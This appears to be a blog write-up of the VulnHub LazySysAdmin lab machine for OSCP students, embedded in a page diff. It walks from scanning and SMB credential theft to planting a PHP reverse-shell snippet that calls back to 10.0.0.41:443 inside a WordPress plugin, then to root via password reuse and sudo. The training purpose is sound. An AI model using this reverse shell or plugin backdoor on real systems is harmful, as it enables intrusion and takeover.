@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>LazySysAdmin :: H4cklife!! — No-life it</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Intro I chose to do this write-up on LazySysAdmin because it is a good box for potential OSCP students to start out on and something that every OSCP pentester and every current OSCP (PWK) student that is ready to take the exam should be able to do without using a walk-through. This box should take 6 hours or less if you do not experience any hang ups or interruptions.
+Download LazySysAdmin Here!
+NMAP Enumeration My first initial NMAP scan I did a service scan on all 65535 ports. I usually port scan in two steps; First finding all ports that are open and then running a service scan against only the open ports in order to save time during the reconnaissance phase.
+ Nmap Service Scan against all ports
+ Nmap Scan Results Web Enumeration To start my web enumeration I began with a basic Nikto scan of the target machine. In doing so reveals several notable webpages to investigate further.
+ Basic Nikto Web Scan
+ Scan Detected 2 Notable Webpages We will note these pages for further enumeration.
+WPSCAN Having discovered that a possible WordPress site was running on the target machine, wpscan was used immediately after the web-scan completed. The user Admin was discovered.
+ Command used to enumerate wordpress users
+ User enumerated using the &amp;ldquo;&amp;ndash;enumerate u&amp;rdquo; flag SMB Enumeration To begin SMB enumeration, enum4linux was used for the initial scan. The scan results revealed several shares that could be connected to using the smbclient. Using information that was gathered from the initial SMB enumeration via enum4linx along with the username discovered during the wpscan, allowed for a precise SMB connection using the smbclient, to be made.
+ Enum4linux Share Details
+ Connecting to the interactive share via the smbclient
+Having connected to the SMB share named share$, allowed for the wp-config file and several other files containing passwords to be retrieved.
+The /wordpress/wp-config file revealed to following username and password combination: Admin  TogieMYSQL12345^^
+The deets.txt file revealed to following password: 12345
+"/>
+<meta name="keywords" content="Hacking"/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="/H4cklife.github.io/posts/lazysysadmin-writeup/" />
+
+
+<link rel="stylesheet" href="/H4cklife.github.io/assets/style.css">
+
+
+<link rel="stylesheet" href="/H4cklife.github.io/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/H4cklife.github.io/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="/H4cklife.github.io/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="LazySysAdmin"/>
+<meta name="twitter:description" content="Intro
+
+I chose to do this write-up on LazySysAdmin because it is a good box for potential OSCP students to start out on and something that every OSCP pentester and every current OSCP (PWK) student that is ready to take the exam should be able to do without using a walk-through. This box should take 6 hours or less if you do not experience any hang ups or interruptions.
+Download LazySysAdmin Here!
+
+NMAP Enumeration
+My first initial NMAP scan I did a service scan on all 65535 ports. I usually port scan in two steps; First finding all ports that are open and then running a service scan against only the open ports in order to save time during the reconnaissance phase.
+
+ Nmap Service Scan against all ports
+
+ Nmap Scan Results
+Web Enumeration
+To start my web enumeration I began with a basic Nikto scan of the target machine. In doing so reveals several notable webpages to investigate further.
+
+ Basic Nikto Web Scan
+
+ Scan Detected 2 Notable Webpages
+We will note these pages for further enumeration.
+
+WPSCAN
+Having discovered that a possible WordPress site was running on the target machine, wpscan was used immediately after the web-scan completed. The user Admin was discovered.
+
+ Command used to enumerate wordpress users
+
+ User enumerated using the &ldquo;&ndash;enumerate u&rdquo; flag
+SMB Enumeration
+To begin SMB enumeration, enum4linux was used for the initial scan. The scan results revealed several shares that could be connected to using the smbclient. Using information that was gathered from the initial SMB enumeration via enum4linx along with the username discovered during the wpscan, allowed for a precise SMB connection using the smbclient, to be made.
+
+ Enum4linux Share Details
+
+ Connecting to the interactive share via the smbclient
+
+Having connected to the SMB share named share$, allowed for the wp-config file and several other files containing passwords to be retrieved.
+
+The /wordpress/wp-config file revealed to following username and password combination:
+Admin
+ TogieMYSQL12345^^
+The deets.txt file revealed to following password:
+12345"/>
+
+
+
+<meta property="og:title" content="LazySysAdmin" />
+<meta property="og:description" content="Intro
+
+I chose to do this write-up on LazySysAdmin because it is a good box for potential OSCP students to start out on and something that every OSCP pentester and every current OSCP (PWK) student that is ready to take the exam should be able to do without using a walk-through. This box should take 6 hours or less if you do not experience any hang ups or interruptions.
+Download LazySysAdmin Here!
+
+NMAP Enumeration
+My first initial NMAP scan I did a service scan on all 65535 ports. I usually port scan in two steps; First finding all ports that are open and then running a service scan against only the open ports in order to save time during the reconnaissance phase.
+
+ Nmap Service Scan against all ports
+
+ Nmap Scan Results
+Web Enumeration
+To start my web enumeration I began with a basic Nikto scan of the target machine. In doing so reveals several notable webpages to investigate further.
+
+ Basic Nikto Web Scan
+
+ Scan Detected 2 Notable Webpages
+We will note these pages for further enumeration.
+
+WPSCAN
+Having discovered that a possible WordPress site was running on the target machine, wpscan was used immediately after the web-scan completed. The user Admin was discovered.
+
+ Command used to enumerate wordpress users
+
+ User enumerated using the &ldquo;&ndash;enumerate u&rdquo; flag
+SMB Enumeration
+To begin SMB enumeration, enum4linux was used for the initial scan. The scan results revealed several shares that could be connected to using the smbclient. Using information that was gathered from the initial SMB enumeration via enum4linx along with the username discovered during the wpscan, allowed for a precise SMB connection using the smbclient, to be made.
+
+ Enum4linux Share Details
+
+ Connecting to the interactive share via the smbclient
+
+Having connected to the SMB share named share$, allowed for the wp-config file and several other files containing passwords to be retrieved.
+
+The /wordpress/wp-config file revealed to following username and password combination:
+Admin
+ TogieMYSQL12345^^
+The deets.txt file revealed to following password:
+12345" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/H4cklife.github.io/posts/lazysysadmin-writeup/" /><meta property="article:published_time" content="2019-06-23T22:34:54-06:00"/>
+<meta property="article:modified_time" content="2019-06-23T22:34:54-06:00"/><meta property="og:site_name" content="H4cklife!!" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/H4cklife.github.io" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
+  <polyline fill="none" stroke="#000" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">H4cklife!!</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/H4cklife.github.io/about/about">About</a></li>
+        
+      
+        
+          <li><a href="/H4cklife.github.io/beefhook/beefhook">Beefhooks</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/H4cklife.github.io/about/about">About</a></li>
+      
+    
+      
+        <li><a href="/H4cklife.github.io/beefhook/beefhook">Beefhooks</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  <div class="post">
+    <h2 class="post-title"><a href="/H4cklife.github.io/posts/lazysysadmin-writeup/">LazySysAdmin</a></h2>
+    <div class="post-meta">
+      
+        <span class="post-date">
+            2019-06-23
+        </span>
+      
+      
+      
+    </div>
+
+    
+
+    
+
+    <div class="post-content">
+      <h2 id="intro">Intro</h2>
+
+<p style="text-align:justify;">I chose to do this write-up on LazySysAdmin because it is <strong>a good box for potential OSCP students</strong> to start out on and something that every OSCP pentester and every current OSCP (PWK) student that is <strong><span style="text-decoration:underline;">ready to take the exam</span></strong> should be able to do without using a walk-through. This box should take 6 hours or less if you do not experience any hang ups or interruptions.</p>
+<p style="text-align:center;"><code><a href="https://www.vulnhub.com/entry/lazysysadmin-1,205/#" target="_blank" rel="noopener">Download LazySysAdmin Here!</a></code></p>
+
+<p><h3>NMAP Enumeration</h3>
+My first initial NMAP scan I did a service scan on all 65535 ports. I usually port scan in two steps; First finding all ports that are open and then running a service scan against only the open ports in order to save time during the reconnaissance phase.</p>
+
+<p><center><img class="alignnone size-full wp-image-124" src="https://h4cklife.files.wordpress.com/2018/05/scan_command.jpg" alt="scan_command" width="449" height="25" /></center> <center><em>Nmap Service Scan against all ports</em></center></p>
+
+<p><center><img class=" size-full wp-image-125 alignnone" src="https://h4cklife.files.wordpress.com/2018/05/scan_results.jpg" alt="scan_results" width="953" height="211" /></center> <center><em>Nmap Scan Results</em></center>
+<h3>Web Enumeration</h3>
+To start my web enumeration I began with a basic <strong>Nikto</strong> scan of the target machine. In doing so reveals several notable webpages to investigate further.</p>
+
+<p><center><img class="alignnone size-full wp-image-128" src="https://h4cklife.files.wordpress.com/2018/05/nikto_command.jpg" alt="nikto_command" width="313" height="21" /></center> <center><em>Basic Nikto Web Scan</em></center></p>
+
+<p><center><img class="alignnone size-full wp-image-129" src="https://h4cklife.files.wordpress.com/2018/05/nikto_results.jpg" alt="nikto_results" width="408" height="163" /></center> <center><em>Scan Detected 2 Notable Webpages</em></center>
+<p style="text-align:center;"><em>We will note these pages for further enumeration.</em></p></p>
+
+<p><h3>WPSCAN</h3>
+Having discovered that a possible WordPress site was running on the target machine, <strong>wpscan</strong> was used immediately after the web-scan completed. The user <strong><span style="text-decoration:underline;">Admin</span></strong> was discovered.</p>
+
+<p><center><img class=" size-full wp-image-133 aligncenter" src="https://h4cklife.files.wordpress.com/2018/05/wpscan_command.jpg" alt="wpscan_command" width="717" height="27" /></center> <em>Command used to enumerate wordpress users</em></p>
+
+<p><center><img class=" size-full wp-image-134 aligncenter" src="https://h4cklife.files.wordpress.com/2018/05/wpscan_results.jpg" alt="wpscan_results" width="397" height="167" /></center> <em>User enumerated using the &ldquo;&ndash;enumerate u&rdquo; flag</em>
+<h3>SMB Enumeration</h3>
+<p style="text-align:justify;">To begin SMB enumeration, <strong>enum4linux </strong>was used for the initial scan. The scan results revealed several shares that could be connected to using the <strong>smbclient. </strong>Using information that was gathered from the initial SMB enumeration via enum4linx along with the username discovered during the wpscan, allowed for a precise SMB connection using the smbclient, to be made.</p></p>
+
+<p><center><img class=" size-full wp-image-131 aligncenter" src="https://h4cklife.files.wordpress.com/2018/05/enum4linux_scan.jpg" alt="enum4linux_scan" width="623" height="456" /></center> <em>Enum4linux Share Details</em></p>
+
+<p><center><img class=" size-full wp-image-132 alignnone" src="https://h4cklife.files.wordpress.com/2018/05/smbclient_command.jpg" alt="smbclient_command" width="820" height="471" /></center> <em>Connecting to the interactive share via the smbclient</em></p>
+
+<p>Having connected to the SMB share named share$, allowed for the <strong>wp-config</strong> file and several other files containing passwords to be retrieved.</p>
+
+<p>The /wordpress/w<span style="text-decoration:underline;">p-config</span> file revealed to following username and password combination:
+<p style="text-align:center;"><strong>Admin</strong>
+<strong> TogieMYSQL12345^^</strong></p>
+The d<span style="text-decoration:underline;">eets.txt</span> file revealed to following password:
+<p style="text-align:center;"><strong>12345</strong></p></p>
+
+<p><h3>WordPress Exploitation</h3>
+Armed with the password taken directly from the wp-config file, a successful login attempt as user &lsquo;Admin&rsquo; was made to authenticate into the WordPress administration panel:</p>
+
+<p><center><img class="alignnone size-full wp-image-137" src="https://h4cklife.files.wordpress.com/2018/05/wp-admin.jpg" alt="Wp-admin" width="1898" height="622" /></center>
+<p style="text-align:justify;">This new access allows for both malicious plugins to be uploaded as well as existing plugins to be modified. In this case I chose to modify an existing plugin due to the fact that WordPress requires headers on added plugins. Modifying an existing plugin would save the step of copying another plugin&rsquo;s header to my payload.</p></p>
+
+<p><center><img class="alignnone size-full wp-image-136" src="https://h4cklife.files.wordpress.com/2018/05/wp-admin_plugins.jpg" alt="wp-admin_plugins" width="1103" height="528" /></center> <em>wp-admin page is now accessible using stolen credentials</em>
+<p style="text-align:justify;">Below is a snippet of the modified &ldquo;Akismet Anti-Spam&rdquo;plugin. All of the plugin contents have been removed except for the header comments and the PHP tags themselves. Towards the bottom of the snippet you will see the beginning my <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" target="_blank" rel="noopener">php-reverse-shell</a> code that replaced the original PHP plugin content:</p></p>
+
+<p><pre><code>/**
+* @package Akismet
+<em>/
+/</em>
+Plugin Name: Akismet Anti-Spam
+Plugin URI: <a href="https://akismet.com/">https://akismet.com/</a>
+Description: Used by millions, Akismet is quite possibly the best way in the world to protect your blog from spam. It keeps your site protected even while you sleep. To get started: activate the Akismet plugin and then go to your Akismet Settings page to set up your API key.
+Version: 3.3.3
+Author: Automattic
+Author URI: <a href="https://automattic.com/wordpress-plugins/">https://automattic.com/wordpress-plugins/</a>
+License: GPLv2 or later
+Text Domain: akismet
+*/</p>
+
+<p>/*
+This program is free software; you can redistribute it and/or
+modify it under the terms of the GNU General Public License
+as published by the Free Software Foundation; either version 2
+of the License, or (at your option) any later version.</p>
+
+<p>This program is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
+GNU General Public License for more details.</p>
+
+<p>You should have received a copy of the GNU General Public License
+along with this program; if not, write to the Free Software
+Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.</p>
+
+<p>Copyright 2005-2015 Automattic, Inc.
+*/</p>
+
+<p>set_time_limit (0);
+$VERSION = &ldquo;1.0&rdquo;;
+<strong><span style="color:#ff6600;">$ip = &lsquo;10.0.0.41&rsquo;; // CHANGE THIS
+$port = 443; // CHANGE THIS</span></strong>
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = &lsquo;uname -a; w; id; /bin/<span style="color:#ff6600;"><strong>bash </strong></span>-i&rsquo;;
+$daemon = 0;
+$debug = 0;
+</code></pre>
+Once the shell code was added the plugin was reactivated and a reverse shell connection was received.</p>
+
+<p><center><img class="alignnone size-full wp-image-138" src="https://h4cklife.files.wordpress.com/2018/05/reverse_shell_connect.jpg" alt="reverse_shell_connect" width="920" height="327" /></center> Reverse  PHP Shell connection and bash tty shell spawned</p>
+
+<p>Now that a local connection has been established, the /etc/passwd file was read in order to see the local users on the target machine for possible attack trajectories to root.</p>
+
+<p><center><img class=" size-full wp-image-139 aligncenter" src="https://h4cklife.files.wordpress.com/2018/05/etc_passwd.jpg" alt="etc_passwd" width="603" height="188" /></center></p>
+
+<p>Next passwords that were enumerated earlier in the process are used to see if authentication to other users on the target machine is possible:</p>
+
+<p><center><img class="  wp-image-140 aligncenter" src="https://h4cklife.files.wordpress.com/2018/05/su_togie.jpg" alt="su_togie" width="374" height="128" /></center></p>
+
+<p>Using the password enumerated from the deet.txt file during the SMB enumeration happened to be the login credentials for the user Togie!</p>
+
+<p><center><img class=" size-full wp-image-141 aligncenter" src="https://h4cklife.files.wordpress.com/2018/05/sudo_l.jpg" alt="sudo_l" width="828" height="235" /></center> sudo -l reveals user can run any command as root
+<p style="text-align:justify;">Immediately after logging in the sudo privileges for user Togie were checked revealing that this user has the ability to run <strong>ANY program</strong> on the machine as root! Upon seeing this we run &ldquo;sudo su,&rdquo; enter the password for Togie, and receive a command line now possessing root privileges!!</p></p>
+
+<p><center><img class="  wp-image-142 aligncenter" src="https://h4cklife.files.wordpress.com/2018/05/sudo_su.jpg" alt="sudo_su" width="359" height="82" /></center> user runs sudo su command and receives root privileges!</p>
+
+<p>Below, the <strong>proof.txt</strong> was read from the /root/ directory validating that this machine has been exploited successfully:
+<pre><span style="color:#ff0000;"><strong>root@LazySysAdmin</strong></span>:/# cd /root
+cd /root
+root@LazySysAdmin:~# ls
+ls
+proof.txt
+root@LazySysAdmin:~# cat proof.txt
+cat proof.txt
+WX6k7NJtA8gfk*w5J3&amp;T@*Ga6!0o5UP89hMVEQ#PT9851</p>
+
+<p>Well done :)</p>
+
+<p>Hope you learn&rsquo;t a few things along the way.</p>
+
+<p>Regards,</p>
+
+<p>Togie Mcdogie</p>
+
+<p>Enjoy some random strings</p>
+
+<p>WX6k7NJtA8gfk*w5J3&amp;T@*Ga6!0o5UP89hMVEQ#PT9851
+2d2v#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7
+pf%&amp;1nRpaj^68ZeV2St9GkdoDkj48Fl$MI97Zt2nebt02
+bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19pu
+</pre>
+<h3></h3>
+<h1>TLDR - Key Takeaways <span class="emoji">📬</span></h1>
+<ul>
+    <li>Brute force SSH once a user has been found</li>
+    <li>Modifying certain PHP plugins on WordPress can offline the website</li>
+    <li>Check sudo capabilities immediately after escalating to a user account using &lsquo;sudo -l&rsquo;</li>
+    <li>Always check for password reuse on the SQL db, web application, sudoers, and anything else you can authenticate to</li>
+    <li>Modify your PHP reverse shell to spawn /bin/bash rather than /bin/sh if you are like me and like bash shells better <span class="emoji">😄</span></li>
+</ul>
+<h2>Additional learning for you</h2>
+<p style="text-align:justify;">Now that the box is rooted continue playing and familiarizing yourself with some of the services running on this machine. There is a phpmyadmin page along with a SQL database running locally on this machine that was not included in this write-up. If you have some time to learn and nothing on your agenda try to find out were the password files are for these services running on the target machine. Also, see if you can discover a new attack vector that hasn&rsquo;t been discovered yet then write your own write-up!</p>
+&nbsp;</p>
+    </div>
+    
+      <div class="pagination">
+        <div class="pagination__title">
+          <span class="pagination__title-h">Read other posts</span>
+          <hr />
+        </div>
+        <div class="pagination__buttons">
+          
+            <span class="button previous">
+              <a href="/H4cklife.github.io/posts/windows-7-kiosk-escape/">
+                <span class="button__icon">←</span>
+                <span class="button__text">Windows 7 Kiosk Escape</span>
+              </a>
+            </span>
+          
+          
+            <span class="button next">
+              <a href="/H4cklife.github.io/posts/a-pre-exam-for-future-oscp-students/">
+                <span class="button__text">A PRE EXAM for FUTURE OSCP STUDENTS!</span>
+                <span class="button__icon">→</span>
+              </a>
+            </span>
+          
+        </div>
+      </div>
+    
+
+    
+
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">Copyright 2019</div>
+    
+  </div>
+</footer>
+
+<script src="/H4cklife.github.io/assets/main.js"></script>
+<script src="/H4cklife.github.io/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
